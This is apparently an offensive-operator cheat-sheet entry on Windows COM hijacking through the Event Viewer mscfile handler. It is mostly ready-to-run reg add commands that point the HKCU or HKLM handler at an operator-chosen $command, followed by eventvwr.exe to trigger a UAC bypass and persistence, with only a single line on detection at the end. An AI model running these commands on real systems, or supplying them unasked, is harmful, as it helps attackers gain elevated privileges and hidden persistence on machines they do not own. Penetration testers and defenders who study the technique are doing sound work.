---
technique: COM Hijacking
category: persistence
targets: Windows COM Registry
protocols: Local
remote_capable: false
tags: windows persistence com-hijacking registry uac
---

# COM Hijacking

COM hijacking changes per-user or machine-wide class registrations so a trusted process resolves an operator-controlled command or DLL. The Event Viewer mscfile handler is a common example for UAC bypass and persistence testing.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Registry write | HKCU hijacks need current-user write access. HKLM hijacks need admin |
| Trigger process | The trusted process must resolve the hijacked COM class or file handler |
| Payload path | The configured command or DLL must remain reachable |

## Windows

### Set HKCU mscfile handler

#cmd #registry #com-hijacking

Set a per-user mscfile open command handler.

```cmd title:"Set HKCU mscfile open command"
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

### Trigger Event Viewer

#cmd #eventvwr #com-hijacking

Launch Event Viewer to resolve the mscfile handler.

```cmd title:"Trigger Event Viewer handler"
eventvwr.exe
```
<!-- cheat -->

### Query HKCU mscfile handler

#cmd #registry #com-hijacking

Query the per-user mscfile handler.

```cmd title:"Query HKCU mscfile handler"
reg query "HKCU\Software\Classes\mscfile\shell\open\command"
```
<!-- cheat -->

### Delete HKCU mscfile handler

#cmd #registry #cleanup

Remove the per-user mscfile handler.

```cmd title:"Delete HKCU mscfile handler"
reg delete "HKCU\Software\Classes\mscfile" /f
```
<!-- cheat -->

### Set HKLM mscfile handler

#cmd #registry #com-hijacking

Set the machine-wide mscfile open command handler.

```cmd title:"Set HKLM mscfile open command"
reg add "HKLM\SOFTWARE\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

## Linux

No Linux operator command is included here. This note covers Windows registry COM hijacking commands.

## Detection

Monitor writes under `HKCU\Software\Classes`, `HKLM\SOFTWARE\Classes`, and trusted processes that spawn unusual children.
